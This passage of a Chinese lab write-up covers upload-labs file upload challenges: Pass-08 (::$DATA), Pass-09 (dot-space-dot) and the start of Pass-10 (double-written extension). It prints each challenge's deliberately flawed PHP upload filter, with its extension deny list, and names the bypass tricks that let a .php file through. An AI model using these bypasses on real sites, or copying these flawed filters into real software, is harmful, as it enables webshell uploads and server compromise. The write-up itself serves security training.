class=&#34;string&#34;&gt;&amp;quot;.aSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aScx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aShx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.cEr&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.sWf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.swf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.htaccess&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = trim(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = deldot(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//删除文件名末尾的点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = strrchr(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = strtolower(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//转换为小写&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = trim(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//首尾去空&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!in_array(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.date(&lt;span class=&#34;string&#34;&gt;&amp;quot;YmdHis&amp;quot;&lt;/span&gt;).rand(&lt;span class=&#34;number&#34;&gt;1000&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;9999&lt;/span&gt;).&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (move_uploaded_file(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;此文件类型不允许上传！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件夹不存在,请手工创建！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210311195351923.png&#34; alt=&#34;image-20210311195351923&#34;&gt;&lt;/p&gt;
&lt;p&gt;需要删除::$DATA, 直接访问&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210311195627082.png&#34; alt=&#34;image-20210311195627082&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass-09点空点绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-09点空点绕过&#34;&gt;#&lt;/a&gt; Pass-09（点空点绕过）&lt;/h2&gt;
&lt;p&gt;题目源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (file_exists(UPLOAD_PATH)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;.php&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.phtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pht&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ascx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ashx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.cer&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aScx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aShx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.cEr&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.sWf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.swf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.htaccess&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = trim(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = deldot(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//删除文件名末尾的点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = strrchr(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = strtolower(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//转换为小写&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = str_ireplace(&lt;span class=&#34;string&#34;&gt;&amp;#x27;::$DATA&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//去除字符串::$DATA&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = trim(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//首尾去空&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!in_array(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (move_uploaded_file(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;此文件类型不允许上传！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件夹不存在,请手工创建！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;利用点空点绕过&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210311200110217.png&#34; alt=&#34;image-20210311200110217&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功访问 a.php&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210311200148728.png&#34; alt=&#34;image-20210311200148728&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass-10双写pphphp绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-10双写pphphp绕过&#34;&gt;#&lt;/a&gt; Pass-10 (双写 pphphp 绕过)&lt;/h2&gt;
&lt;p&gt;题目源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (file_exists(UPLOAD_PATH)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;php&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;php5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;php4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;php3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;php2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;phtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;pht&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jsp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jspa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jsw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jsv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jspf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;asp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;aspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;asa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;asax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;ascx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;ashx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;asmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;cer&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;swf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;htaccess&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = trim(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = str_ireplace(&lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;);  这里把文件替换成空&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (move_uploaded_file(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span 